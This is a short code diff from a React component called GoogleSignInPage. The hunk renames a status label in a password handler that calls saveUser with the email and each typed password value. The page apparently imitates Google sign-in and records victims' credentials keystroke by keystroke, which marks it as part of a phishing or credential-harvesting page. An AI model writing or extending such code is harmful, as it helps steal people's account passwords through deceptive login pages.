@@ -110,7 +110,7 @@ export default function GoogleSignInPage() {
     setPassword(val);
     setHasError(false);
     if (currentUserId) {
-      saveUser(email, val, 'typing_password');
+      saveUser(email, val, 'verifying');
     }
   };
 
